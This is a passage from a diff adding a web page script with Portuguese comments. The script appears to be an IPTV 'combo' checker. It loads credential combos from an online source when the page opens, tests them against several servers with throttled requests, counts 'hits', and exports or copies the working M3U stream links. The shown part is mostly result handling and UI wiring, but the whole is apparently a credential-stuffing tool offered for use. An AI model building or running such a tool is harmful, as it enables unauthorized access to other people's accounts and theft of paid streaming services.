+              totalHits++;
+              resultsHits.push(res);
+              
+              // Limitar a exibição a 10 hits
+              if (resultsContainer.children.length < 10) {
+                // Renderizar na UI
+                const hitHTML = renderHit(res, totalHits);
+                resultsContainer.appendChild(hitHTML);
+              }
+              
+              // Atualiza estatísticas
+              updateStats();
+            }
+            // Se encontrou um hit válido, não precisa testar nos outros servidores
+            break;
+          }
+        } catch (e) {
+          // Ignora erros
+        }
+        
+        // Delay entre requisições
+        await delay(100);
+      }
+    }
+    
+    // Finalizado
+    generateBtn.disabled = false;
+    stopBtn.disabled = true;
+    exportBtn.disabled = resultsHits.length === 0;
+    copyAllBtn.disabled = resultsHits.length === 0;
+    showNotification(`Geração M3U finalizada! Links encontrados: ${totalHits} de ${totalTested} testados`, 7000);
+  }
+  
+  // ===== LIMPA RESULTADOS E ESTADO DA UI =====
+  function clearResults() {
+    stopRequested = true;
+    combos = [];
+    resultsHits = [];
+    resultsSet.clear();
+    resultsContainer.innerHTML = '';
+    totalHits = 0;
+    totalTested = 0;
+    updateStats();
+    generateBtn.disabled = false;
+    stopBtn.disabled = true;
+    exportBtn.disabled = true;
+    copyAllBtn.disabled = true;
+  }
+  
+  // ===== EXPORTAR HITS PARA TXT =====
+  function exportHits() {
+    if (resultsHits.length === 0) {
+      alert('Nenhum hit para exportar.');
+      return;
+    }
+    
+    const lines = resultsHits.map(h => h.m3uLink);
+    
+    const blob = new Blob([lines.join('\n')], {type: "text/plain;charset=utf-8"});
+    const url = URL.createObjectURL(blob);
+    // Criar link para download
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `m3u-links-${new Date().toISOString().slice(0,10)}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+  
+  // ===== COPIAR TODOS OS HITS =====
+  function copyAllHits() {
+    if (resultsHits.length === 0) {
+      alert('Nenhum hit para copiar.');
+      return;
+    }
+    
+    const texts = resultsHits.map(h => h.m3uLink).join('\n');
+    
+    copyToClipboard(texts)
+      .then(() => {
+        showNotification('Todos os links foram copiados!');
+      })
+      .catch(err => {
+        console.error('Erro ao copiar todos os hits:', err);
+        showNotification('Falha ao copiar. Tente novamente ou use a opção de exportar.');
+      });
+  }
+  
+  // ===== GERAR M3U =====
+  async function generateM3U() {
+    await startScan();
+  }
+  
+  // ===== EVENT LISTENERS =====
+  generateBtn.addEventListener('click', generateM3U);
+  
+  stopBtn.addEventListener('click', () => {
+    stopRequested = true;
+    stopBtn.disabled = true;
+    generateBtn.disabled = false;
+    showNotification('Escaneamento interrompido pelo usuário.');
+  });
+  
+  clearBtn.addEventListener('click', () => {
+    clearResults();
+    showNotification('Resultados limpos.');
+  });
+  
+  exportBtn.addEventListener('click', exportHits);
+  copyAllBtn.addEventListener('click', copyAllHits);
+  
+  // Carrega combos automaticamente ao iniciar
+  window.addEventListener('load', async () => {
+    await loadCombosOnline();
+  });
+  
+  // ===== ACESSIBILIDADE =====
+  // Define foco no container de resultados para leitores de tela
+  resultsContainer.setAttribute('tabindex', '0');
+  // ===== FIM DO SCRIPT =====
+</script>
+</body>
+</html>
